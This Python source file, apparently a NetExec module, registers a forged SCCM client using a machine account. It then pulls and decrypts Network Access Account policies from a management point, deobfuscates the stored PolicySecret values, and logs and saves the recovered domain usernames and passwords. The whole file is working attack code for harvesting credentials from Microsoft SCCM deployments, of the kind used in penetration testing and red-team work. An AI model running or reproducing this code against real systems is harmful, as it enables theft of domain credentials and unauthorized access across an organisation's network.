from datetime import UTC, datetime, timedelta
from email import policy
from email.parser import BytesParser
from hashlib import sha1
from http.client import HTTPConnection, HTTPSConnection
from pathlib import Path
from time import sleep
from urllib.parse import urlsplit
from uuid import UUID, uuid4
from xml.etree import ElementTree as ET
import zlib

from Cryptodome.Cipher import AES, DES3
from Cryptodome.Util.Padding import unpad
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.x509.oid import NameOID, ObjectIdentifier
from impacket.http import AUTH_NTLM, HTTPClientSecurityProvider
from pyasn1.codec.der.decoder import decode
from pyasn1.type.univ import OctetString
from pyasn1_modules import rfc5652

from nxc.helpers.path import sanitize_path_component
from nxc.paths import NXC_PATH


class SCCMClient:
    """
    Request NAA policies using an existing machine account.

    Protocol references: garrettfoster13/sccmhunter, xpn/sccmwtf and
    Mayyhem/SharpSCCM. PolicySecret key derivation documented by @skelsec.
    """

    boundary = "aAbBcCdDv1234567890VxXyYzZ"
    date_format = "%Y-%m-%dT%H:%M:%SZ"

    def __init__(self, logger, management_point, domain, username, password, nt_hash, delay):
        self.logger = logger
        self.server = urlsplit(management_point if "://" in management_point else f"http://{management_point}")
        if self.server.scheme not in ("http", "https") or not self.server.hostname:
            raise ValueError("MP must be a hostname or an HTTP(S) URL")
        self.domain = domain
        self.username = username
        if "\\" in username:
            self.domain, self.username = username.split("\\", 1)
        self.name = self.username.removesuffix("$")
        self.fqdn = f"{self.name}.{self.domain}"
        self.delay = delay
        self.auth = HTTPClientSecurityProvider(AUTH_NTLM)
        lm_hash, nt_hash = nt_hash.split(":", 1) if ":" in nt_hash else ("", nt_hash)
        self.auth.set_credentials(self.username, password, self.domain, lm_hash, nt_hash)

    def request(self, method, path, body=None, headers=None, authenticate=False):
        headers = {"User-Agent": "ConfigMgr Messaging HTTP Sender", **(headers or {})}
        http = (HTTPSConnection if self.server.scheme == "https" else HTTPConnection)(self.server.hostname, self.server.port, timeout=30)
        try:
            if authenticate:
                headers.update(self.auth.get_auth_headers(http, method, path, headers)[0])
            http.request(method, path, body=body, headers=headers)
            response = http.getresponse()
            content = response.read()
            if response.status != 200:
                raise ValueError(f"{method} {path}: HTTP {response.status} {response.reason}")
            return content, response.getheader("Content-Type", "")
        finally:
            http.close()

    def sign(self, data):
        return self.key.sign(data, padding.PKCS1v15(), hashes.SHA256())[::-1].hex().upper()

    def create_certificate(self):
        self.key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        subject = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "ConfigMgr Client")])
        now = datetime.now(UTC)
        return (
            x509.CertificateBuilder().subject_name(subject).issuer_name(subject).public_key(self.key.public_key())
            .serial_number(x509.random_serial_number()).not_valid_before(now - timedelta(days=2)).not_valid_after(now + timedelta(days=365))
            .add_extension(x509.KeyUsage(digital_signature=True, content_commitment=False, key_encipherment=False, data_encipherment=True, key_agreement=False, key_cert_sign=False, crl_sign=False, encipher_only=False, decipher_only=False), critical=False)
            .add_extension(x509.ExtendedKeyUsage([ObjectIdentifier("1.3.6.1.4.1.311.101.2"), ObjectIdentifier("1.3.6.1.4.1.311.101")]), critical=False)
            .sign(self.key, hashes.SHA256())
        )

    def send_message(self, body, endpoint, client_id=None):
        compressed = zlib.compress(body)
        header = ET.Element("Msg", ReplyCompression="zlib", SchemaVersion="1.1")
        ET.SubElement(header, "Body", Type="ByteRange", Length=str(len(body) - 2), Offset="0")
        ET.SubElement(header, "CorrelationID").text = "{00000000-0000-0000-0000-000000000000}"
        hooks = ET.SubElement(header, "Hooks")
        if client_id:
            public_key = bytes.fromhex("0602000000A40000525341310008000001000100") + self.key.public_key().public_numbers().n.to_bytes(256, "little")
            hook = ET.SubElement(hooks, "Hook2", Name="clientauth")
            for name, value in {
                "AuthSenderMachine": self.name,
                "PublicKey": public_key.hex().upper(),
                "ClientIDSignature": self.sign(f"GUID:{client_id.upper()}\0".encode("utf-16-le")),
                "PayloadSignature": self.sign(compressed),
                "ClientCapabilities": "NonSSL",
                "HashAlgorithm": "1.2.840.113549.1.1.11",
            }.items():
                ET.SubElement(hook, "Property", Name=name).text = value
        ET.SubElement(hooks, "Hook3", Name="zlib-compress")
        ET.SubElement(header, "ID").text = "{" + str(uuid4()).upper() + "}"
        ET.SubElement(header, "Payload", Type="inline")
        for name, value in {
            "Priority": "0", "Protocol": "http", "ReplyMode": "Sync",
            "ReplyTo": f"direct:{self.name}:SccmMessaging", "SentTime": datetime.now(UTC).strftime(self.date_format),
            **({"SourceID": f"GUID:{client_id}"} if client_id else {}),
            "SourceHost": self.name, "TargetAddress": f"mp:{endpoint}", "TargetEndpoint": endpoint,
            "TargetHost": self.server.hostname, "Timeout": "60000",
        }.items():
            ET.SubElement(header, name).text = value
        multipart = f"--{self.boundary}\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode("ascii")
        multipart += ET.tostring(header, encoding="unicode").encode("utf-16")
        multipart += f"\r\n--{self.boundary}\r\ncontent-type: application/octet-stream\r\n\r\n".encode("ascii")
        multipart += compressed + f"\r\n--{self.boundary}--".encode("ascii")
        path = "/ccm_system/request" if client_id else "/ccm_system_windowsauth/request"
        for attempt in range(3):
            content, content_type = self.request("CCM_POST", path, multipart, {"Content-Type": f'multipart/mixed; boundary="{self.boundary}"'}, authenticate=not client_id)
            if content:
                message = BytesParser(policy=policy.default).parsebytes(f"Content-Type: {content_type}\r\nMIME-Version: 1.0\r\n\r\n".encode("ascii") + content)
                for part in message.walk():
                    if part.get_content_type() == "application/octet-stream":
                        return zlib.decompress(part.get_payload(decode=True)).decode("utf-16-le").lstrip("\ufeff").rstrip("\0\r\n")
                raise ValueError("SCCM response has no compressed payload")
            if attempt < 2:
                sleep(self.delay)
        raise ValueError("SCCM returned an empty response after three attempts")

    def register(self):
        certificate = self.create_certificate().public_bytes(serialization.Encoding.DER).hex().upper()
        data = ET.Element("Data", HashAlgorithm="1.2.840.113549.1.1.11", SMSID="", RequestType="Registration", TimeStamp=datetime.now(UTC).strftime(self.date_format))
        ET.SubElement(data, "AgentInformation", AgentIdentity="CCMSetup.exe", AgentVersion="5.00.8325.0000", AgentType="0")
        certificates = ET.SubElement(data, "Certificates")
        for name in ("Encryption", "Signing"):
            ET.SubElement(certificates, name, Encoding="HexBinary", KeyType="1").text = certificate
        properties = ET.SubElement(data, "DiscoveryProperties")
        for name, value in {"Netbios Name": self.name, "FQ Name": self.fqdn, "Locale ID": "2058", "InternetFlag": "0"}.items():
            ET.SubElement(properties, "Property", Name=name, Value=value)
        embedded = ET.tostring(data, encoding="unicode")
        body = f"<ClientRegistrationRequest>{embedded}<Signature><SignatureValue>{self.sign(embedded.encode('utf-16-le'))}</SignatureValue></Signature></ClientRegistrationRequest>\0"
        response = ET.fromstring(self.send_message(body.encode("utf-16-le") + b"\r\n", "MP_ClientRegistration"))
        for node in response.iter():
            if node.get("SMSID", "").startswith("GUID:"):
                return str(UUID(node.get("SMSID")[5:])).upper()
        raise ValueError("Client registration failed: no SMSID returned")

    def get_assignments(self, client_id):
        body = ET.Element("RequestAssignments", SchemaVersion="1.00", ACK="false", RequestType="Always")
        machine = ET.SubElement(ET.SubElement(body, "Identification"), "Machine")
        for name, value in {"ClientID": f"GUID:{client_id}", "FQDN": self.fqdn, "NetBIOSName": self.name, "SID": ""}.items():
            ET.SubElement(machine, name).text = value
        ET.SubElement(body.find("Identification"), "User")
        ET.SubElement(body, "PolicySource").text = "SMS:PRI"
        ET.SubElement(body, "Resource", ResourceType="Machine")
        ET.SubElement(body, "ServerCookie")
        return self.send_message(ET.tostring(body, encoding="unicode").encode("utf-16-le") + b"\0\0\r\n", "MP_PolicyManager", client_id)

    def decrypt_policy(self, content):
        envelope = decode(content, asn1Spec=rfc5652.ContentInfo())[0]
        envelope = decode(envelope["content"], asn1Spec=rfc5652.EnvelopedData())[0]
        recipient = envelope["recipientInfos"][0]["ktri"]
        key_algorithm = str(recipient["keyEncryptionAlgorithm"]["algorithm"])
        if key_algorithm == "1.2.840.113549.1.1.7":
            rsa_padding = padding.OAEP(mgf=padding.MGF1(hashes.SHA1()), algorithm=hashes.SHA1(), label=None)
        elif key_algorithm == "1.2.840.113549.1.1.1":
            rsa_padding = padding.PKCS1v15()
        else:
            raise ValueError(f"Unsupported policy key transport: {key_algorithm}")
        key = self.key.decrypt(recipient["encryptedKey"].asOctets(), rsa_padding)
        encrypted = envelope["encryptedContentInfo"]
        algorithm = str(encrypted["contentEncryptionAlgorithm"]["algorithm"])
        if algorithm in ("2.16.840.1.101.3.4.1.2", "2.16.840.1.101.3.4.1.42"):
            cipher = AES
        elif algorithm == "1.2.840.113549.3.7":
            cipher = DES3
        else:
            raise ValueError(f"Unsupported policy encryption: {algorithm}")
        iv = decode(encrypted["contentEncryptionAlgorithm"]["parameters"], asn1Spec=OctetString())[0].asOctets()
        cleartext = cipher.new(key, cipher.MODE_CBC, iv).decrypt(encrypted["encryptedContent"].asOctets())
        try:
            cleartext = unpad(cleartext, cipher.block_size)
        except ValueError as e:
            self.logger.debug(f"Policy has no valid PKCS7 padding: {e}")
        cleartext = cleartext.decode("utf-16-le").lstrip("\ufeff")
        end = cleartext.find("</Policy>")
        return cleartext[:end + len("</Policy>")] if end != -1 else cleartext.rstrip("\0")

    @staticmethod
    def deobfuscate_secret(value):
        blob = bytes.fromhex(value.strip())
        algorithm = int.from_bytes(blob[56:60], "little")
        if algorithm == 0x6610:
            cipher, key_length = AES, 32
        elif algorithm == 0x6603:
            cipher, key_length = DES3, 24
        else:
            raise ValueError(f"Unsupported PolicySecret algorithm: {algorithm:#x}")
        digest = sha1(blob[4:44]).digest().ljust(64, b"\0")
        derived = sha1(bytes(b ^ 0x36 for b in digest)).digest() + sha1(bytes(b ^ 0x5C for b in digest)).digest()
        length = int.from_bytes(blob[52:56], "little")
        cleartext = cipher.new(derived[:key_length], cipher.MODE_CBC, bytes(cipher.block_size)).decrypt(blob[64:64 + length])
        return unpad(cleartext, cipher.block_size).decode("utf-16-le").rstrip("\0")

    def save_file(self, name, content):
        path = (self.output / sanitize_path_component(name)).resolve()
        if not path.is_relative_to(self.output):
            raise ValueError("Policy output path escapes its base directory")
        path.write_bytes(content)

    def run(self):
        self.logger.display(f"Requesting NAA policies from {self.server.netloc} using {self.username}")
        client_id = self.register()
        self.logger.success(f"Registered SCCM client: GUID:{client_id}")
        base = (Path(NXC_PATH) / "logs" / "sccm").resolve()
        self.output = (base / sanitize_path_component(f"{self.server.netloc}_{client_id}")).resolve()
        if not self.output.is_relative_to(base):
            raise ValueError("SCCM output path escapes its base directory")
        self.output.mkdir(parents=True, exist_ok=True)
        sleep(self.delay)
        assignments = self.get_assignments(client_id)
        self.save_file("assignments.xml", assignments.encode("utf-8"))
        credentials = []
        policies = ET.fromstring(assignments).findall(".//Policy[@PolicyCategory='NAAConfig']")
        if not policies:
            self.logger.display("No NAAConfig policy assigned to this client")
        for index, assignment in enumerate(policies, 1):
            try:
                location = urlsplit(assignment.findtext("PolicyLocation").replace("<mp>", self.server.netloc))
                if (location.hostname, location.port or (443 if location.scheme == "https" else 80)) != (self.server.hostname, self.server.port or (443 if self.server.scheme == "https" else 80)) or location.scheme != self.server.scheme:
                    raise ValueError("Policy location points to a different management point")
                token = f"GUID:{client_id};{datetime.now(UTC).strftime(self.date_format)};2"
                content, _ = self.request("GET", location.path + (f"?{location.query}" if location.query else ""), headers={"ClientToken": token, "ClientTokenSignature": self.sign(f"{token}\0".encode("utf-16-le"))})
                self.save_file(f"naapolicy-{index}.bin", content)
                cleartext = self.decrypt_policy(content)
                self.save_file(f"naapolicy-{index}.xml", cleartext.encode("utf-8"))
                for instance in ET.fromstring(cleartext).findall(".//instance[@class='CCM_NetworkAccessAccount']"):
                    username = self.deobfuscate_secret(instance.findtext(".//property[@name='NetworkAccessUsername']/value"))
                    password = self.deobfuscate_secret(instance.findtext(".//property[@name='NetworkAccessPassword']/value"))
                    self.logger.highlight(f"NAA: {username}:{password}")
                    credentials.append(f"{username}:{password}")
            except Exception as e:
                self.logger.fail(f"Could not process NAA policy {index}: {e}")
                self.logger.debug("NAA policy error", exc_info=True)
        if credentials:
            self.save_file("naacreds.txt", ("\n".join(credentials) + "\n").encode("utf-8"))
        self.logger.success(f"SCCM policies saved to {self.output}")
